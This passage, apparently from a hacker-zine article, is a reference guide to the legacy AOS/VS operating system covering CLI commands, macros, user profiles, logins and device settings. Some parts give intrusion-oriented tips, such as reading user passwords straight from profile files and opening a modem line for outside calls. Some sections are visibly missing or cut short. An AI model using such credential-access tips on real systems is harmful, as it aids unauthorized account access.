&#039;+&#039;, which is equivalent to &#039;*&#039; at DOS, and &#039;#&#039; which is equivalent to
&#039;*.*&#039; at DOS.  For example, FILE +.CLI will show all the files whose
names end with &quot;.CLI&quot;; FILE :UDD:# will display all the files in UDD
(which won&#039;t happen if you just issue FILE :UDD -- in that case, you&#039;ll
see only information about the directory UDD, and not the files within
it).

As with Unix, you can enter more than one command on a line if you
separate the commands with a &#039;;&#039; (a semicolon).  If you need more than a
line for your commands, type an &#039;&amp;&#039; before pressing Return, and the CLI
will just keep on reading, instead of processing the command line and
try to run it.  This goes ONLY for a sequence like this: &quot;&amp;&lt;Return&gt;&quot;, an
&#039;&amp;&#039; anywhere else acts just like any other character.

There are several control characters the CLI takes and uses:

                 CONTROL CHAR               WHAT IT DOES
                 ------------------+-------------------------------
                 Ctrl-C              Begins a Ctrl char sequence.

                 Ctrl-D              End of file.

                 Ctrl-L              Clear screen.

                 Ctrl-P              Don&#039;t interpret the following
                                     character in any special way.

                 Ctrl-S              Stops output to the terminal.

                 Ctrl-Q              Resumes output to the terminal.

                 Ctrl-U              Cancel (delete) current input line.

                 Ctrl-C Ctrl-A       Interrupt current process.

                 Ctrl-C Ctrl-B       Terminates current process.

                 Ctrl-C Ctrl-C       Empties the input buffer.

                 Ctrl-C Ctrl-E       Terminates current process and
                                     create a break file (where
                                     termination message is stored).

If the CLI is run with a /NOCA switch, it will ignore Ctrl-C Ctrl-A
sequences, so if put in the start of a macro file, it won&#039;t allow you to
break that macro and enter the CLI.

AOS/VS had many file types.  File types are three letter acronyms
(although not always) for the file; the same way DOS and VMS have
extensions, the file type controls what the file is (it can have any
extension in its name).  File types have a decimal numbers assigned to
them, as well.  There are 70 file types, although the operating
system reserves space for 128.  The user can define his own file types.
These are some of the he AOS/VS file types:

                     TYPE NUMBER     TYPECODE       MEANING
                    -------------+------------+-----------------
All these types  /      11        LDU        Logical disk unit
are directories -|      12        CPD        Control point directory
                 \      10        DIR        Directory

                        52        HST        Remote host (X.25 SVC)
                        54        PVC        Remote host (X.25 PVC)
                        64        UDF        User data file
                        69        LOG        System log file
                        74        PRV        AOS/VS program file
                        75        WRD        Word processing file
                        87        UNX        Unix file (created on a Unix)
                        95        SPD        Spreadsheet file
                       104        PIP        Pipe
                       105        TTX        Teletex file


&quot;Generic files&quot; are actually pointers that help using devices and files.
For example, the @NULL generic file functions like /dev/null on Unix.
Here are the generic files:

     @CONSOLE       The process&#039; (user&#039;s) console.

     @DATA          A long file created by the user that will be used as
                    data by a program.  @DATA is set using DATAFILE.

     @INPUT         A short file created by the user that will be used
                    as input by a program.  @INPUT is set using
                    PROCESS/INPUT=.

     @NULL          Well, null.

     @LIST          A long output file that will be used as a program&#039;s
                    output.  @LIST is set using LISTFILE.

     @OUTPUT        A short output file for a program.  @OUTPUT is set
                    using PROCESS/OUTPUT=.

When a program is run, it will sometime try to open one of these generic
files.  If they&#039;re not set, it will fail on error 21 (non existent
file).  But if the file is set, it can use it.  So, for example, you can
use PROCESS/OUTPUT=@CONSOLE PROGRAM for output to go to you, or
PROCESS/OUTPUT=OUT_FILE PROGRAM for it to go to OUT_FILE.

&quot;Device files&quot; are files the connect to hardware parts, such as modems,
printers, tapes, diskette drives, FAX machines, etc.  In due time, a
program called EXEC makes a connection between processes and devices and
utilizes those devices (see the section titled &quot;The &#039;EXEC&#039; Program&quot;).
Some devices are also used by the backup related programs DUMP and LOAD,
and more.  Some of these are:

     @MTB0:x        The magnetic tape unit #0, x being a dumpfile on the
                    tape (x starts from 0).

     @DPJ           A diskette device name.

     @LFD           A generic labeled diskette file name.


The equivalent of a PATH (usually environment variable) in other systems
is called SEARCHLIST in AOS/VS.  When you call a command, or ask for
help, the CLI looks through your SEARCHLIST for the files.  So, assuming
you typed HELP MODEM, and somewhere in your searchlist there exists a
file called MODEM.CLI, HELP will show you,
modem           - Macro, File :UTIL:COMM:MODEM.CLI
The same goes for other commands, even TYPE (TYPE MODEM.CLI from
:UDD:HBT, if :UTIL:COMM is in your searchlist and there&#039;s no MODEM.CLI
in :UDD:HBT will work).

To display your searchlist, just use plain SEARCHLIST.  To change it,
use SEARCHLIST path,path,path ...

It&#039;s possible to set a password for your current CLI session.  This
password is not the password used upon login!  It&#039;s a password the user
sets to protect his session.  He then types LOCK, and from then, anyone
wishing to use the user&#039;s CLI (from the user&#039;s console), must enter the
password first.  Legal passwords are up to 32 characters long, not
including Ctrl characters.

The CLI offers several levels to the user.  It starts on the highest
level, 0, and the user may create other level, and use POP to move up a
level, and PUSH to go down a level.  When a user POPs to a level,
the CLI environment of the older (higher) level remains (the environment
of the level he was in until that time is therefore changed).  When he
PUSHes, the current level&#039;s environment is copied to the lower level.
To display the current CLI level, use LEVEL.  To display the level&#039;s
environment, use CURRENT.  To display an upper level&#039;s environment
(except when at the highest level), use PREVIOUS.

When you want to print a file, or run something in the background, you
have to submit it as a job.  The submit a printing job, use the QPRINT
command (will print the file).  To submit a batch job, which is for
executing a command, use QBATCH (for example, QBATCH MASM ASMPROG).

AOS/VS had a facility called &quot;queues&quot;, managed by the EXEC program (see
&quot;The &#039;EXEC&#039; Program&quot;).  A queue is a place where file transfer, batch,
and printing jobs are stored until the right process can take them and
execute them.  The standard queues are:

          QUEUE NAME       JOB TYPE                 CONTENTS
          --------------+------------+----------------------------------
          BATCH_INPUT        Batch       Batch input files.
                                         Submitted by QBATCH or QSUBMIT.

          BATCH_OUTPUT       Printing    Output files from finished
                                         batch jobs (usually sent to a
                                         line printer).

          BATCH_LIST         Printing    List files from finished batch
                                         jobs (usually sent to a line
                                         printer).

              ((Batch jobs are submitted through QBATCH.))

          LPT                Printing    Print jobs submitted by QSUBMIT.

          MOUNTQ             Mount       Tape mount requests.
                                         Submitted by MOUNT.

After a job has been submitted, use QDISPLAY to show its status.  Use
QHOLD to hold jobs and QUNHOLD to release them.  Last, to display the
status of all queues, use QDISPLAY as well.

AOS/VS also has an extensive help facility.  For help on broad topics,
use HELP (to list topics) and then HELP *TOPIC.  For help on system
commands, use HELP COMMAND (for a list of switches) or HELP/V COMMAND for
more details.

CLI MACRO PROGRAMMING
~~~~~~~~~~~~~~~~~~~~

Macro filenames usually end with &quot;.CLI&quot; are usually text files (filetype
TXT).  A macro is a file that will be executed when called (adding .CLI
to the name when calling isn&#039;t necessary), and perform the commands (or
other macros) in it.  If the macro matches the name of a CLI command,
the macro must be called together with the .CLI part of its name.  Macros
expand arguments in the following way:

Range Arguments (like filenames):

%x%       Argument number x, with its switches.  %0% is the macro&#039;s
          name.
%-%       All the arguments, with their switches, except for %0%.
%x-y,i%   Arguments x through y, in jumps of i.  If x or i are missing,
          the CLI assumes 1.  If y is omitted, 32767 is assumed.  For
          example, if the arguments were &quot;1 2 3 4 5 6 7&quot;, a %2-6,2% call
          expands to &quot;2 4 6&quot;.

Switch Arguments:

%x/%      All the switches of argument x.
%x\%      Argument x, without its switches.
%x/y%     Argument x, with switch number y.
%x/y=%    The value of argument&#039;s x switch number y.
%x\y%     All the switches of argument x, including their values, except
          for switch number y.

Conditionals are used in the form of [CONDITIONAL,ARGS].  If a
conditional returns TRUE, the CLI executes everything after it until it
reaches an ELSE or an END.  Otherwise, it skips to an ELSE or an END
(basic programming).

!EQUAL    True if both arguments equal alphabetically.
!NEQUAL   True if both arguments don&#039;t equal alphabetically.
!UEQ      True if both arguments equal numerically.

These are called pseudo macros, and are usually built like conditionals,
although sometimes they just substitute for a part of the environment.
There are about 60 of them, but I&#039;ll only list a selected few for
brevity.

[!ACL path]         Expands for the ACL of path.
[!ASCII octnum]     Expands to the ASCII character with the octnum octal
                    number.  For example, newline is octal 12.
[!CLI]              Expands to CLI32 or CLI16, according to the CLI.
[!DATE]             Date, like 01-Jan-93.
[!SYSTEM]           Expands to the type of OS.
[!SEARCHLIST]       Expands to the search list.
[!LEVEL]            Expands to the current CLI level.
[!CLI]              Expands to the CLI type.
[!EXPLODE args]     Puts a comma between each pair of character in args.
                    When used with STRING, in converts spaces and tabs
                    too.  When used with WRITE, in converts into space.
[!LISTFILE]         Expands to the path of the listfile.
[!USERNAME]         Expands to the username of the person running the
                    macro.
[!LOGON]            Returns CONSOLE if logged on to a terminal or BATCH
                    if logged in on a batch stream (only works for EXEC
                    logons).
[!DATAFILE]         Expands to the path of the datafile.
[!HID [host]]       Returns the host ID.  With [host] return the host ID
                    of [host].
[!HOST [host]]      Returns the host name.
[!STRING]           Expands to the value of the CLI string.

A more complex pseudo macro is !READ:
[!READ[/args] text]

!READ prints text to the output and then expands to what was received
from the input (which is considered finished when a newline is
received).  !READ&#039;s args are functional only under CLI32 and are:

/EOF=str

          The string that will be returned if EOF is met.

/FILEID=file

          Reads from file instead of @OUTPUT.  The file must be already
          opened using OPEN.

/LENGTH=x

          Read until x characters were typed.

/S

          Discards all typed after a semicolon (&#039;;&#039;) or a left bracket
          (&#039;[&#039;).  Otherwise, that text must be a valid CLI command or
          macro, or a pseudo macro or macro ending with a right bracket
          if following the left bracket.

Note that all pseudo macros, including !READ can be used at the command
line and not just in CLI macro files.

AOS/VS can also be programmed in 16 bit and 32 bit Assembly (and
compiled using MASM), BASIC, Fortran, C, Pascal and probably others.

This second program is actually quite simple.  I do not even read the
UPF type file directly; I just feed text into the PREDITOR (see the next
section).

SYSTEM SECURITY
~~~~~~~~~~~~~~

The AOS/VS login is performed in the following manner.

Every username has a file associated with it in the :UPD directory.
That file is its profile, and contains the account profile.  Once the
user has entered a correct username/password pair, the operating system
loads the user&#039;s profile (which includes how much memory and disk space
the user is allowed to use and the user&#039;s allowed privileges) into its
internal tables.  Several privileges which can be set are the initial
user directory and initial program that will be executed upon completion
of the login (eg, the CLI); how many processes the user may run; what
process priorities the user has; and what SUPER privileges the user has
(eg, SUPERUSER, SUPERPROCESS).

As mentioned, if the user has SUPER privileges, he must activate them
himself (using the right command, or PRIVILEGE if using CLI32).

An important thing to know about password security is that if the system
is running Data General&#039;s XODIAC networking software, user&#039;s might not
be able to access remote machines through the network if the passwords
are encrypted.  Therefore, if you are on a XODIAC host, chances are the
passwords won&#039;t be encrypted.  The ACL of the :UPD directory doesn&#039;t let
every user can access it, though.

Passwords are changed by the user by pressing Ctrl-L immediately after
entering the password at login.  This will only work for users that have
the privilege to set their own passwords.  Legal passwords are 6 to 15
characters.

This the format (the fields) of the AOS/VS profiles:

* Password
* Initial program          To be executed after login
* Initial IPC file         The LOGON file
* Initial directory
* Default user priority    The user&#039;s process priority
* Maximum queue priority   The highest queue priority which the user can
                           set for a batch job.  The lower the number, the
                           higher the priority (1-255).
* Unlimited son processes
* Maximum son processes    If the above option if off.
* Disk quota in blocks
* Logical address space    Allows the user to control the size of the
(batch)                    logical address space in which his programs
                           will be executed.  If -1, the system sets.
* Minimum working set      The minimum number of pages a user can have in
(batch)                    their active processes.  If -1, the system
                           determines the value according to the program&#039;s
                           demands.
* Maximum working set
(batch)
* Logical address space
(non batch)
* Minimum working set
(non batch)
* Maximum working set
(non batch)
* Encrypt password
* Superuser
* Superprocess
* Use IPC                  Allows the user to make IPC calls.
* Use console
* Use batch
* Use virtual console      Virtual consoles are created by networked
                           logins.
* Use modem                A modem is a console with the characteristic of
                           /MOD on.
* Change password
* Change priority
* Change type
* Change username          Allows user to become another username without
                           actually logging in into that user&#039;s profile.
* Access devices           Allows user to directly issue Assembly
                           instructions to devices.
* Create without block     Allows the user to start a son process without
                           blocking the father process.
* System manager privileges
* Access local devices remotely
* Change addr. space type  Allows 32 bit processes to be called from 16
                           bit processes (usually on, since there is a
                           CLI16, but most programs are 32 bit).
* Change working set limit Allows user to change the working set size of
                           programs.
* Comments

User profiles can be created, deleted, read, and modified from the
AOS/VS User Profile Editor: PREDITOR.  PREDITOR gives you a prompt
from which you can read any account and the values of its fields.
PREDITOR does not, however, display the password field, whether it&#039;s
encrypted or not -- just an indication of what the Encrypt Password
field is set to.  This is easily overcome, since if you can execute the
PREDITOR, you can just as well SED the :UPD:USERNAME file and look at
the password (it&#039;s right up there) -- PREDITOR can only be loaded by a
user that can become Superuser.

Legal commands for the PREDITOR are Create, Delete, Edit, List,
Question, Rename, and Use.  They can all be abbreviated to their first
letter.  When CREATE is called, it first asks if you want to set the
password, and depending on the answer asks you to enter a password.  It
then queries about the other fields, giving you three options (usually):
YES, NO, and NL, the system&#039;s default.  DELETE just asks for a
confirmation on deleting the user, and also his home directory.  EDIT is
just like CREATE, allowing you to modify any field in the user&#039;s profile
(including the password).  LIST lists the status of every field in the
profile (by using a template profile, such as &#039;+&#039;, one could view every
user on the system).  QUESTION sets the system defaults, which will later
be used by CREATE and EDIT.  RENAME allows you to rename a user to another
name, and USE changes the value in the !DEFAULT variable (your username).

Logins are handled by a program called EXEC (that&#039;s what the EXEC-32
x.xx.xx.xx part in the login message means).  EXEC just reads the
username/password and if correct, logs the user in.  After EXEC has been
completed, the Initial Program from the profile is run.  The commands for
logins are CONTROL @EXEC DISABLE and ENABLE.  See &quot;The &#039;EXEC&#039; Program&quot;
for more information about EXEC.

When using ENABLE, the console receives login capabilities; apart from
actually logging in, EXEC will also display :UTIL:LOGON.BANNER.SCREEN.

ENABLE
------

/ALL      Gives all the consoles the said capabilities.

/TRIES=x  Sets maximum login tries to x.

/STOP     This will have the same result as if an operator issued
          CONTROL @EXEC DISABLE &lt;console&gt; after the maximum login tries
          was exceeded.

/CONTINUE

          Lock console for 10 seconds and then continue.

/FORCE    Change the other parameters while the console is enabled.


SYSTEM COMMANDS
~~~~~~~~~~~~~~

Every command has its own switches.  However, all commands accept the
/1, /2, /L and /Q switches (and /STR=string and /ESTR=string under
/CLI32).

/1=ERROR|ABORT|IGNORE|WARNING
/2=WARNING|ERROR|ABORT|IGNORE

          Controls what the program will do under a class 1 or 2 error.
          The first option listed is the default.  ERROR displays
          &quot;Error: something&quot; and stops command execution.  ABORT aborts
          the command.  IGNORE ignores the error, and WARNING displays
          &quot;Warning: something&quot; and continues with the command.

/L=path   The command will store all its output in &#039;path&#039;.

/Q        Display output in columns with on space separating them (an
          exception to this switch is TYPE).

/STR=string
/ESTR=string

          The command will store its output in the &#039;string&#039; string
          variable, which can be viewed later using the STRING command.
          If there is no output or the command is TYPE or COPY the string
          is set to null.  /ESTR is for error output, /STR is for
          regular output.

Some important AOS/VS commands are listed next.  I included information
about the DUMP and LOAD commands for information purposes only; as they
require diskettes, I don&#039;t think you&#039;ll use them daily.  However, I
didn&#039;t go into diskette handling, etc in detail.

Sorted alphabetically:


ACL &lt;path&gt;
----------

ACL is a utility to control the ACL (Access Control List).  An ACL is
just what is sounds like: it includes a list of usernames and what kind
of access they have to the file.  ACL used one-letter access code, as
follows.

         LETTER                 TYPE/FILE                    TYPE/DIR
      -----------+---------------------------------+------------------------
       A(ppend)     Append to a file.                 Create files in the
                                                      directory or move files
                                                      into it.

       E(xecute)   Execute the program.               Allows access to
                                                      the directory
                                                      (changing into it,
                                                      reading, etc).

       O(wner)      Allows the user to change the ACL or erase the file/dir.

       R(ead)       Read a file.                      List the files in
                                                      the directory.

       W(rite)      Write to a file.                  Create, delete or
                                                      change ACLs of files
                                                      in the directory.

The default ACL for any file is OWARE for the user.

ACL &lt;path&gt; shows the ACL.  To modify the ACL:

ACL &lt;path&gt; [user,access] [...]

Access being one of the OWARE group, for example:

ACL PHRACK43 HBT,OWARE       (There is NO space between &#039;username&#039; and
                             &#039;access&#039;!)

ACL PHRACK42 HBT,OWARE +,R   (In this example, the &#039;+&#039; template was
used, &#039;+&#039; standing for all the users.  This means that HBT has full
access to the file, while the rest of the users can only read it.
If templates are used, they should be used last, with specific usernames
before them.)

Under CLI32 group access is also available in the format of:

ACL &lt;path&gt; [user:group,access] [...]

Switches:

/[BEFORE|AFTER]/[TCR|TLA|TLM]=date and/or time

/TYPE=type

          These function just like the same switches in FILESTATUS.

/D        Use the default settings (OWARE).  Defaults may be changed
          using DEFCAL.

/K        Delete ACL - no one but a superuser will be able to access the
          file.

/V        Show each file changed.


BROWSE
------

BROWSE is a program to browse (view, search, scroll in any direction)
through any number of ASCII or binary files.  While in BROWSE help is
available by using &#039;H&#039; or &#039;?&#039;.  BROWSE starts at the end of file and
lets you move backward (but you can change this).

No further details are included since BROWSE can run only on CRT
terminals (the actual terminals the employees usually sit at), and I
didn&#039;t have the pleasure of using one of these (nor do I think will the
information be of any use).


CHARACTERISTICS
---------------

CHARACTERISTICS displays or sets the characteristics of a device
attached to a terminal (not a printer, for example).  To change
characteristics of a device permanently and not just for the current CLI
level, you must be PID 2 (local console) or have SYSTEMMANAGER privilege
on.  To this, you must use EXEC first to DISABLE the device, use
CHARACTERISTICS, and then use EXEC to ENABLE the device (see the section
titled &quot;The &#039;EXEC&#039; Program&quot;).  The CHARACTERISTICS switch will be
/DEFAULT/[default device characteristics] device.  &quot;device&quot; for example,
is @CON100.

CHARACTERISTICS switches look like this:
CHARACTERISTICS /[ON|OFF]/SWITCH.  It&#039;s self explanatory.

/8BT

          Interpret all 8 bits of an ASCII char as data.  (For use with
          8 bit character sets, of course.)

/16B      For Asian language translation.

/4010I    Device is a DG model 4010I terminal.

/6012     Device is a DG model 6012 terminal.

/605X     Device is a DG DASHER model 6052, 6053, D210 or D211 terminal.

/6130     Device is a DG DASHER model 6130, D410 or D460 terminal.

/ACC      Line requires modem access control (only users with the Use
          Modem privilege may login).

/AUTOBAUD

          The system will automatically determine the terminal&#039;s baud
          (it&#039;s bps, damnit!) rate.

/BAUD=b

          Sets a device&#039;s bps rate to b.  b can be 45.5, 50, 75, 110,
          134.5, 150, 300, 600, 1200, 1800, 2400, 3600, 4800, 7200,
          9600, 19200, 38400.

/BREAK=[BMOB|CAOB|CBOB|CFOB|DCOB]

          How the system will respond to a BREAK:
          BMOB (default) Clears binary mode and restore normal character
                         handling
          CAOB           Issues Ctrl-C Ctrl-A
          CBOB           Issues Ctrl-C Ctrl-B
          CFOB           Issues Ctrl-C Ctrl-F
          DCOB           Disconnect user

/CALLOUT  Allow host initiated calls (outside calls).

/CHARLEN=[5|6|7|8]

          Character length in bits, *including* stop bit.

/CONTYPE=connection type

          like &quot;mesg n&quot; in Unix).

/OFC      XON/XOFF output flow control.

/OTT      Convert characters sequence &quot;~}&quot; to an escape (use with VT100
          emulation, or how will you escape).

Knowledge is knowledge, but AT&amp;T is something different.  Here is how
you&#039;d open a modem line for calling out:  (You must be SYSTEMMANAGER)

CLEARDEVICE/RXON @CON999
CONTROL @EXEC DISABLE @CON999
CHARACTERISTICS/ON/MOD/MDUA/CTD/CALLOUT @CON999
CONTROL @EXEC ENABLE @CON999
((And here&#039;s how you put it back))
CLEARDEVICE/RXON @CON999
CONTROL @EXEC DISABLE @CON999
CHARACTERISTICS/DEF @CON999
CONTROL @EXEC ENABLE @CON999


CLEARDEVICE &lt;device&gt;
--------------------

You must be PID 2 (local console) or have SYSTEMMANAGER privileges
turned on to use CLEARDEVICE on a terminal that isn&#039;t yours.  &lt;device&gt;
must be a terminal line (eg, @CON100).

/RXON     Simulates a XON character from the device.

/SBREAK   Sends a break character to the device.

CONINFO [console]
-----------------

CONINFO shows information about a console to the user.  Without an
argument, it gives the user information about his console.  With a
parameter, and if the user has SYSTEMMANAGER privilege turned on, it
gives information about the console specified as argument.  The
information gives changes depending as to how the console is connected:

                 CONNECTION                   INFORMATION

CREATE &lt;pathname&gt;
-----------------

CREATE creates a file (TXT or UDF).  CREATE/LINK creates file links.

/DATASENSITIVE

          Creates a file with a data sensitive record format.

/DIRECTORY

          Creates a directory.

/DYNAMIC

          Creates a file with a dynamic record format.

/ELEMENTSIZE=x

          Sets the minimum amount of space by which a file can grow in 512
          byte blocks.

/FIXED=x

          Creates a file with a fixed length record format, with a
          length of x.

/HASHFRAMESIZE=x

          Sets the unit into which the system divides the directory for file
          access to x.  The default is 7.  The best formula for this is: the
          nearest prime number (up to 157, the maximum) of the number of
          files / 20.

/I

          Inserts typed text at @INPUT as the contents of the file.  The
          input ends when a single &#039;)&#039; followed by a Return is typed.

/INDEXLEVELS=x

          Sets the maximum number of data elements the file can hold to x.

/LINK

          Creates a linked file to the second argument.  For example, to link
          MODEM.CLI with :UTIL:NET:MODEM.CLI, use CREATE/LINK MODEM.CLI
          :UTIL:NET:MODEM.CLI.

/M

          Takes the contents of the file from a macro that follows.  The
          input ends when a single &#039;)&#039; followed by a Return is typed.

/MAXSIZE=x

          Creates a control point directory of x*512 bytes (a disk block).

/TYPE=t

          Creates a file of type t.  Where t is either the right decimal
          number or the right 3 letter mnemonic (see the section titled
          &quot;System Structure&quot;).

/VARIABLE

          Creates a file with variable record formats.


DELETE &lt;file&gt;
-------------

Deletes file.  The opposite of CREATE.


DUMP &lt;file&gt; [path]
------------------

DUMP dumps file from the current directory to a file.  Such files can be
a diskette or a magnetic tape.  [path] is the template for the files to
dump -- if it doesn&#039;t exist, everything will be dumped.  DUMP isn&#039;t
compatible with Unix; AOS/VS has a TAR command for dumping file for use
in Unix.

/[AFTER|BEFORE]/[TLA|TLM|TCR]=date and/or time

/TYPE=[\]type

          These switches works just like the one in FILESTATUS.

/BUFFERSIZE=x

          Sets the buffer to x (x is a multiply of 1024).  x is given in
          bytes, but if specified as xK it reads a kilobytes (1 kilobyte
          is 1024 bytes).  The larger the buffer, the more data fits on
          the tape.

/DENSITY=[800|1600|6250|ADM|LOW|MEDIUM|HIGH]

          The numbers are for bits per inch.  ADM means Automatic
          Density Matching.  If one of the other values is used, there&#039;s
          a possibility that it won&#039;t fit in another tape unit (unit X&#039;s
          LOW value isn&#039;t the same as unit Y&#039;s).

/FLAT

          Eliminates the directory structure.  Otherwise, DUMP keeps the
          directory tree when dumping.

/IBM

          Writes to a tape that an IBM format label, created using
          LABEL/I.

/L[=pathname]

          Lists filenames dumped in pathname, or in @LIST.  (See the
          command after LOAD, &#039;LISTFILE&#039;).

/NACL     Don&#039;t dump ACLs, so that when reloading, the default ACL will
          be created.

/RETAIN=x

          Sets the retention period.  The dumpfile cannot be overwritten
          until x days have passed.

/SEQUENTIAL

          Will not rewind the tape after completing the dump.

/V        Verify the dump by listing the dumped files.


FED
---

FED (moohaha), is a program, not a CLI command.  FED stands for File
Editor Utility, and it lets you examine locations in disk files and
modify them.  FED is run as XEQ FED [path].  The FED inner prompt is
&#039;_&#039;.

FED has internal keywords.  They are run by using ESC &lt;keyword&gt; (if you
can&#039;t use escape, try setting CHAR/ON/XLT/OTT and use &quot;~}&quot;).

To understand FED well, you must be familiar with the DEBUG command and
some Assembly, which seems to me is beyond the scope of this file.  So
if you do know what you&#039;re doing, look DEBUG up.

C    Run a CLI under FED.
DIS  Change display mode
G    Examine/modify ring register
H    Help
I    Define/list temporary symbols
J    Delete temporary symbols
M    Examine/modify input radix
MEM  Examine/modify file locations
S    Search disk locations
T    Examine/modify display mode
X    Enable/disable symbol table
Y    Enable/disable logging to a file
Z    Exit FED
?    Display verbose error messages

/I=file   Use the commands in filename for the editing session.

/L=file   Save all FED commands/responses to file.

/S=file   Use file as the symbol table file.

/N        Don&#039;t use a symbol table file.

/P        Treat the disk file as a program file.

/R        Open for read-only.

/U        Treat the disk data as a user data file.

/X        Treat the disk file as an OS file.


LOAD &lt;file&gt; [path]
------------------

LOAD restores files that were dumped.  If LOAD is invoked from CLI32, a
macro calls the DUMP_II program, which is a more advanced version of
DUMP.  If [path] is omitted, the entire dumpfile is loaded into the
current directory (with its directory tree).

/[AFTER|BEFORE]/[TLA|TLM|TCR]=date and/or time

/TYPE=[\]type

          These switches function the same as in FILESTATUS.

/BUFFERSIZE=x

/DENSITY=density was already set with DUMP, use ADM if at all

/FLAT

/IBM

/L[=path]

/NACL

/SEQUENTIAL

/V

          These switches function the same as in DUMP, only in the
          reverse direction (for example, /NACL won&#039;t load the
          dumpfile&#039;s ACL and create new default --  username,OWARE
          -- ACLs.

/DELETE

          Delete any existing file with matching name.

/N        Don&#039;t load, just list files in dumpfile.

/Q        Squeeze console messages and file lists (don&#039;t use tabs and
          more than one space).


LISTFILE [path]
---------------

LISTFILE sets the @LIST file (see the section titled &quot;System Structure&quot;
for details).  In short, program uses the generic file name @LIST, it
will use the files specified through LISTFILE instead.

/G        Sets the LISTFILE to the generic @LIST.

/K        Sets the LISTFILE to null.

/LEVEL=x  Sets the LISTFILE to that of level number x LISTFILE.

/P        Sets the LISTFILE to the previous environment setting.


PASSWORD
--------

Only exists with CLI32.

(For more information, see the section titled &quot;System Structure&quot;).

/CHANGE   Change the current CLI password.

/PROMPT
/NOPROMPT

          If /PROMPT, the user will have to enter his password when
          using LOCK (so he can&#039;t LOCK the console without a password).
          Otherwise, automatically locks the console when LOCK is
          executed.

/READ=path
/WRITE=path

          /WRITE Encrypts the CLI password and writes it to the file
          [path].  When /READ is issued, the encrypted password is read
          from the file.  When a password check needs to be done, the
          password entered is encrypted and the encrypted forms are
          compared.  This way, a &quot;PASSWORD/READ=PWD&quot; in the LOGON file
          can set the CLI password automatically at logon.

I am not sure of the way that the password in encrypted when being saved
with /WRITE.  Nor, for that matter, do I have any more information about
the way the login passwords are encrypted in the profiles (when and if
they are).

Beware of situation where PWD, for example, has the string &quot;qwerty&quot; in
it, and you type PASSWORD/READ=qwerty.  If you use LOCK, the terminal is
locked forever, since &quot;qwerty&quot; is assumed to be the encrypted form.


PROCESS &lt;path&gt;
--------------

Creates a son process to run the program in &lt;path&gt;.  &lt;path&gt; is assumed
to end with .PR, and only then to be just &lt;path&gt;.

/ACCESSDEVICES

          Allows the process to define and access I/O devices.  Requires
          the Access Devices privilege as defined in the profile.

/BLOCK

          Blocks the father CLI until the process terminates.  If the
          CLI isn&#039;t blocked, you can use CHECKTERMS to display the
          process&#039; termination message when it terminates.

/BREAK

          Creates a break file (.BRK) if the process has an error or
          terminates because of one.  If EXEC is TERMINATEd instead of
          HALTed using the HALT &#039;EXEC&#039; command, it will create a .BRK
          file.

/BSON

          Blocks the son process until freed with UNBLOCK.

/CHLOGICALTYPE

          Allows the process to change its logical type (16 bit or 32
          bit).  Requires the Change Logical Type privilege, which, as
          mentioned in &quot;System Security&quot; is usually on.

/CHPRIORITY

          Allows the process to change its priority.  Requires Change
          Priority privilege.

/CHTYPE

          Allows the process to create any other type of process and
          change its own process type.  Requires Change Type privilege.

/CHUSERNAME

          Allows the process to create a new process with a different
          username than its own.  Requires Change Username privilege.

/CHWSS

          Allows the process to change its working set size.  Requires
          Change Working Setsize privilege.

/CONSOLE[=console]

          Makes the new process&#039; console the same as that of the
          father&#039;s console, or [console].

/CPU=x    Limits CPU time for x seconds.

/DACL     Don&#039;t pass default ACL to the son process.

/DATA[=path]

          Make the son&#039;s @DATA file the same as the father&#039;s, or [path].

/DEBUG    Starts the son process in the debugger.

/DEFAULT  Gives the son process the same privileges as the father&#039;s.

/DIRECTORY=path

          Make path the initial directory for the son process.

/DUMP     Appends a dump to the breakfile data.

/INPUT[=path]

          Makes the son&#039;s @INPUT file the same as the father&#039;s, or
          [path].

/IOC

          Makes the son&#039;s @INPUT, @OUTPUT AND @CONSOLE the same as does
          of the father.

/LIST=[path]

          Makes the son&#039;s @LIST file the same as the father&#039;s, or
          [path].

/MEMORY=x Sets the son&#039;s process maximum memory size in 2kb pages.

/NAME=name

          Assign name to the son process.  Now it can accessed both by
          PID and by name.

/OUTPUT=path

          Makes the son&#039;s @OUTPUT file to be path.

/PRIORITY=x

          Gives the process a priority of 1-511 (highest-lowest).

/PREEMTIBLE
/RESIDENT

          Makes the son process pre-emtible or resident.  The default is
          swappable.

/SONS[=x]

          Allows the son to create one less son process than the father,
          or x.

/STRING

          Stores the termination message in the CLI string.

/SUPERPROCESS
/SUPERUSER

          Allows the son process to enter the appropriate SUPER mode.

/UNLIMITEDSONS

          Allows the son process to create unlimited amount of sons.


SED [path]
----------

SED is a program and not a CLI command and therefore run as XEQ SED ...
[path] is the file to be edited.  The SED inner prompt is &#039;*&#039;.

SED is a text editor for creating and modifying files.  SED&#039;s help
facility is accessible by typing HELP from SED:

ESCAPES   ADD TEXT   CHANGE TEXT   DELETE TEXT   LISTINGS   POSITIONING
-------   --------   -----------   -----------   --------   -----------
EXECUTE   APPEND      MODIFY        DELETE        LIST       POSITION
HELP      INSERT      REPLACE       MOVE          VIEW       FIND
SAVE      DUPLICATE   SUBSTITUTE    JOIN          PRINT
          UNDO        SPLIT
                      CUT
                      PASTE

EXITING   MISC            HELP WORDS
-------   ----            -----------------------
ABANDON   CLEAR           CURSOR_CONTROL ADDRESS
BYE       DIRECTORY       RANGE          SOURCE
CLI       DISPLAY         SEARCH_STRING  DESTINATION
DO        SET             KEYS           SYNTAX
          SPELL           SWITCHES

SED&#039;s line editing keys are:

Ctrl-A    Move to end of line.
Ctrl-B    Move to end of last word.
Ctrl-E    Toggle insert mode.
Ctrl-F    Move to start of next word.
Ctrl-H    Move to beginning of line.
Ctrl-I    A tab.
Ctrl-K    Erase everything right of cursor (like in EMACS).
Ctrl-X    Move on character to the right.
Ctrl-Y    Move on character to the left.
Ctrl-U    Delete entire line.

The commands are mostly self explanatory, but the format is something
like this.  Suppose you want to modify line #12, you&#039;d write MODIFY 12,
which will put you on line 12.  Use the control keys to move about and
edit the line, then press Return!  If you don&#039;t press return but just
escape back to the SED prompt, your changes will be lost!

The same goes for most commands, if you need help, just type HELP
COMMAND from the SED &#039;*&#039; prompt.


/ED=dir   Finds the SED .ED files in dir.

/NO_ED    Don&#039;t use .ED files.

/NO_FORM_FEEDS

          Strip form feeds from the file.

/NO_RECREATE

          Don&#039;t reset the date of the file after changing it.

/NO_SCREEN

          Don&#039;t update the console automatically.

/PROFILE=path

          path is the SED startup file, that contains legal SED
          commands.

/WORK=dir

          Use this directory for SED temporary files.


SEND &lt;pid&gt; &lt;message&gt;
--------------------

Sends sends &lt;message&gt; to a user, based on the user&#039;s PID.  Users&#039; PIDs
